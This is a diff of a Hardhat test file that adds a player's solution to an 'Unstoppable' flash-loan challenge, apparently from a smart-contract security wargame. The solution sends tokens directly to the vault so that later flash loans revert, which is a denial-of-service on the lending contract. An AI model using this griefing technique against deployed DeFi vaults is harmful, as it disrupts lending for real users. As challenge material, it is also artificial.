@@ -45,14 +45,24 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const amount = ethers.utils.formatUnits(INITIAL_PLAYER_TOKEN_BALANCE) / 2;
+        await token.connect(player).transfer(vault.address, amount);
+        attackContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
+            vault.address
+        );
+        await expect(
+            attackContract.connect(player).executeFlashLoan(amount)
+        ).to.be.reverted;
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
         // It is no longer possible to execute flash loans
         await expect(
             receiverContract.executeFlashLoan(100n * 10n ** 18n)
         ).to.be.reverted;
     });
 });
+
+// yarn hardhat test ./test/unstoppable/unstoppable.challenge.js
